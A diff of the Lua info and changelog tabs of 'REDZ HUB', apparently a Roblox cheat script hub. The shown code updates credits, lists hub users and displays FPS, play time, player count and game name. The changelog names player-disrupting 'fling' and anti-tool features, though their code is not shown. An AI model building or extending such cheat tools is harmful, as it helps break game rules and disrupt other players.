+infoTab:AddSection({ "Usuários no servidor" })
+infoTab:AddParagraph({
+"Usuarios do Hub no servidor: " .. table.concat((function()
+local t = {}
+for nome,_ in pairs(UsuariosDoHub) do
+table.insert(t, nome)
+end
+return t
+end)(), ", ")
+})
+
 infoTab:AddSection({ "Créditos dos desenvolvedores" })
 infoTab:AddParagraph({ "Tiktok do criador: @fk_fakezin" })
 infoTab:AddParagraph({ "Canal do YouTube do criador: @Ghzinn_007 e @BlessedTeam_BT" })
 infoTab:AddParagraph({ "Meu discord: @xitad077" })
 infoTab:AddParagraph({ "Meu Roblox: BlessedTeam_BT e Gr3g0rilsir" })
-infoTab:AddParagraph({ "Colaboração:", "Anna & Blessed Team" })
+infoTab:AddParagraph({ "Colaboração:", "Anna, WX, Entity (Quiel) & BLESSED TEAM" })
 infoTab:AddParagraph({ "Você está usando:", "REDZ HUB" })
+
+infoTab:AddSection({ "Em caso de dúvidas sobre o REDz" })
+infoTab:AddParagraph({ "Me chama nessas redes:", "Tiktok ou Discord" })
 
 infoTab:AddSection({ "Informações Client" })
 
 --=== UTIL (cria "botões" não clicáveis e função segura de update) ===--
 local function createInfoBlock(tab, title, initial)
-	-- Tenta usar Paragraph (título + descrição, igual na imagem).
-	local block
-	local ok = pcall(function()
-		block = tab:AddParagraph({ Title = title, Content = initial })
-	end)
-	-- Se a lib não tiver Paragraph, cai para Label (1 linha).
-	if not ok or not block then
-		ok = pcall(function()
-			block = tab:AddLabel(title .. (initial and ("\n" .. initial) or ""))
-		end)
-	end
-	return block
+    -- Tenta usar Paragraph (título + descrição, igual na imagem).
+    local block
+    local ok = pcall(function()
+        block = tab:AddParagraph({ Title = title, Content = initial })
+    end)
+    -- Se a lib não tiver Paragraph, cai para Label (1 linha).
+    if not ok or not block then
+        ok = pcall(function()
+            block = tab:AddLabel(title .. (initial and ("\n" .. initial) or ""))
+        end)
+    end
+    return block
 end
 
 local function setBlockText(block, title, text)
-	if not block then return end
-	-- Tenta métodos comuns de libs de UI
-	local ok = pcall(function()
-		if block.Set then return block:Set(text) end
-		if block.SetDesc then return block:SetDesc(text) end
-		if block.SetText then return block:SetText(text) end
-		if block.Update then return block:Update(text) end
-		if block.Refresh then return block:Refresh(text) end
-	end)
-	-- Fallback para Label simples (reescreve tudo)
-	if not ok then
-		pcall(function()
-			if block.Text ~= nil then
-				block.Text = title .. "\n" .. text
-			end
-		end)
-	end
+    if not block then return end
+    -- Tenta métodos comuns de libs de UI
+    local ok = pcall(function()
+        if block.Set then return block:Set(text) end
+        if block.SetDesc then return block:SetDesc(text) end
+        if block.SetText then return block:SetText(text) end
+        if block.Update then return block:Update(text) end
+        if block.Refresh then return block:Refresh(text) end
+    end)
+    -- Fallback para Label simples (reescreve tudo)
+    if not ok then
+        pcall(function()
+            if block.Text ~= nil then
+                block.Text = title .. "\n" .. text
+            end
+        end)
+    end
 end
 
 -- Função para pegar a data atual
 local function getCurrentDate()
-	local currentTime = os.time()
-	return os.date("%d/%m/%Y", currentTime)
+    local currentTime = os.time()
+    return os.date("%d/%m/%Y", currentTime)
 end
 --====================================================================--
 
@@ -543,50 +358,50 @@ local startClock = os.clock()
 -- FPS (cálculo suave por frame)
 local currentFPS = 0
 RunService.RenderStepped:Connect(function(dt)
-	currentFPS = math.floor(1/dt + 0.5)
+    currentFPS = math.floor(1/dt + 0.5)
 end)
 
 -- Pega nome do jogo atual
 local function getCurrentGameName()
-	local success, gameInfo = pcall(function()
-		return MarketplaceService:GetProductInfo(game.PlaceId)
-	end)
-	if success and gameInfo and gameInfo.Name then
-		return gameInfo.Name
-	else
-		return "Jogo Desconhecido"
-	end
+    local success, gameInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    if success and gameInfo and gameInfo.Name then
+        return gameInfo.Name
+    else
+        return "Jogo Desconhecido"
+    end
 end
 
 -- Atualizações periódicas (meio segundo)
 task.spawn(function()
-	while true do
-		task.wait(0.5)
+    while true do
+        task.wait(0.5)
 
-		-- Atualiza data de boas-vindas
-		setBlockText(welcomeBlock, "Seja Bem Vindo Ao REDZ HUB! Hoje É Dia: ", getCurrentDate())
+        -- Atualiza data de boas-vindas
+        setBlockText(welcomeBlock, "Seja Bem Vindo Ao REDZ HUB! Hoje É Dia: ", getCurrentDate())
 
-		-- Tempo de uso
-		local e = os.clock() - startClock
-		local h = math.floor(e/3600)
-		local m = math.floor((e%3600)/60)
-		local s = math.floor(e%60)
-		setBlockText(timerBlock, "Tempo De Uso Do Script: ", string.format("%02d:%02d:%02d", h, m, s))
+        -- Tempo de uso
+        local e = os.clock() - startClock
+        local h = math.floor(e/3600)
+        local m = math.floor((e%3600)/60)
+        local s = math.floor(e%60)
+        setBlockText(timerBlock, "Tempo De Uso Do Script: ", string.format("%02d:%02d:%02d", h, m, s))
 
-		-- FPS
-		setBlockText(fpsBlock, "Seu Fps: ", "FPS: " .. tostring(currentFPS))
+        -- FPS
+        setBlockText(fpsBlock, "Seu Fps: ", "FPS: " .. tostring(currentFPS))
 
-		-- Players (reforça o valor mesmo sem eventos)
-		setBlockText(playersBlock, "Quantidade De Pessoas No Server", tostring(#Players:GetPlayers()))
+        -- Players (reforça o valor mesmo sem eventos)
+        setBlockText(playersBlock, "Quantidade De Pessoas No Server: ", tostring(#Players:GetPlayers()))
 
-		-- Nome do jogo atual
-		setBlockText(gameBlock, "Seu Jogo :", getCurrentGameName())
-	end
+        -- Nome do jogo atual
+        setBlockText(gameBlock, "Seu Jogo :", getCurrentGameName())
+    end
 end)
 
 -- Atualiza players ao entrar/sair alguém
 local function refreshPlayers()
-	setBlockText(playersBlock, "Quantidade De Pessoas No Server: ", tostring(#Players:GetPlayers()))
+    setBlockText(playersBlock, "Quantidade De Pessoas No Server: ", tostring(#Players:GetPlayers()))
 end
 Players.PlayerAdded:Connect(refreshPlayers)
 Players.PlayerRemoving:Connect(refreshPlayers)
@@ -624,9 +439,11 @@ NovidadeTab:AddSection({ "Adicionado" })
 NovidadeTab:AddParagraph({ "Adicionado:", "[+] Interface Nova do Script." })
 NovidadeTab:AddParagraph({ "Adicionado:", "[+] AntiTool Player" })
 
-NovidadeTab:AddSection({ "Foi/Será Removido/ Arrumado" })
-NovidadeTab:AddParagraph({ "Sera Removido:", "Funções Inuteis/Sem Utilidades" })
+NovidadeTab:AddSection({ "Arrumado" })
 NovidadeTab:AddParagraph({ "Sera Arrumado:", "Alguns Flings serão corrigidos" })
+
+NovidadeTab:AddSection({ "Removido" })
+NovidadeTab:AddParagraph({ "Sera Removido:", "Funções Inuteis/Sem Utilidades" })
 
 local CarTab = Window:MakeTab({"Veiculo", "car"})
 
